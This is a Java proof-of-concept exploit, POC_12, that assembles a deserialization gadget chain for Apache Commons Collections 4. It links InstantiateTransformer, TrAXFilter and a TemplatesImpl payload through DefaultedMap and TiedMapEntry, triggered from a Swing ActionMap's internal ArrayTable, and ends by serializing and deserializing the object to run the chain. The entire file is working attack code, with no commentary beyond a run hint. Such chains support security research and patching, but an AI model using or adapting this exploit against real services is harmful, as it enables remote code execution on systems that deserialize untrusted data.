package com.example.CC4;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.DefaultedMap;

import javax.swing.*;
import javax.swing.text.DefaultEditorKit;
import javax.xml.transform.Templates;
import java.util.concurrent.ConcurrentHashMap;

public class POC_12 {

    /***
     * run with actionMap_hashCode.jar
     */

    public static void main(String[] args) throws Exception {
        Templates templates = Share.getTemplatesImplObj();
        InstantiateTransformer transformer = new InstantiateTransformer<>(new Class[]{Templates.class}, new Object[]{templates});
        DefaultedMap d = new DefaultedMap<>("1");
        TiedMapEntry t = new TiedMapEntry<>(d, TrAXFilter.class);

        ActionMap map = new ActionMap();
        DefaultEditorKit.BeepAction action = new DefaultEditorKit.BeepAction();
        Class atClass = Class.forName("javax.swing.ArrayTable");
        Object arrayTable = ReflectionUtil.createWithoutConstructor(atClass);
        Object[] table = new Object[16];
        for (int i = 0; i < 16; i += 2) {
            table[i] = i == 14 ? t : "key" + i;
            table[i + 1] = action;
        }

        ReflectionUtil.setField(arrayTable, "table", table);
        ReflectionUtil.setField(map, "arrayTable", arrayTable);
        ReflectionUtil.setField(d, "value", transformer);
        SerializeUtil.deserialize(SerializeUtil.serialize(map));
    }

}
